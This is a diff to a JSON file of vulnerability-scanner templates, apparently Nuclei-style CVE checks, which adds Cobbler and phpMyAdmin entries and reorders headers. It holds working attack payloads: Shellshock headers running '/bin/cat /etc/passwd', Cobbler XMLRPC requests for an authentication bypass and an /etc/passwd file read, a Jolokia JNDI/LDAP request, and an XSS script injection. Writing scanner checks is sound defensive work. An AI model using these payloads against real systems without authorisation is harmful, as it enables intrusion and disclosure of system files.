@@ -520,7 +520,7 @@
     {
       "id": "CVE-2009-5020",
       "info": {
-        "name": "AWStats < 6.95 - Open redirect",
+        "name": "AWStats < 6.95 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -3277,9 +3277,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -5657,6 +5657,20 @@
         {
           "raw": [
             "POST /jolokia/read/getDiagnosticOptions HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.\nContent-Type: application/x-www-form-urlencoded\n\n{\n   \"type\":\"read\",\n   \"mbean\":\"java.lang:type=Memory\",\n   \"target\":{\n      \"url\":\"service:jmx:rmi:///jndi/ldap://127.0.0.1:1389/o=tomcat\"\n   }\n}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-1000226",
+      "info": {
+        "name": "Cobbler versions 2.6.11+, (2.0.0+ or older versions) - Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<?xml version='1.0'?>\n<methodCall>\n  <methodName>_CobblerXMLRPCInterface__make_token</methodName>\n  <params>\n    <param>\n      <value>\n        <string>cobbler</string>\n      </value>\n    </param>\n  </params>\n</methodCall>\n"
           ]
         }
       ]
@@ -14231,8 +14245,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -14648,6 +14662,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?m=user&c=Users&a=logout&referurl=https://example.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-40323",
+      "info": {
+        "name": "Cobbler before 3.3.0 allows log poisoning, and resultant Remote Code Execution, via an XMLRPC method",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<?xml version='1.0'?>\n<methodCall>\n  <methodName>find_profile</methodName>\n  <params>\n    <param>\n      <value>\n        <struct>\n          <member>\n            <name>name</name>\n            <value>\n              <string>*</string>\n            </value>\n          </member>\n        </struct>\n      </value>\n    </param>\n  </params>\n</methodCall>\n",
+            "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<?xml version='1.0'?>\n<methodCall>\n  <methodName>generate_script</methodName>\n  <params>\n    <param>\n      <value>\n        <string>{{profile}}</string>\n      </value>\n    </param>\n    <param>\n      <value>\n        <string></string>\n      </value>\n    </param>\n    <param>\n      <value>\n        <string>/etc/passwd</string>\n      </value>\n    </param>\n  </params>\n</methodCall>\n"
           ]
         }
       ]
@@ -15444,6 +15473,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/aj.html?a=devi"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-23808",
+      "info": {
+        "name": "phpMyAdmin < 5.1.2 - XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/setup/index.php?page=servers&mode=test&id=\">'><script>alert(document.domain)</script>"
           ]
         }
       ]
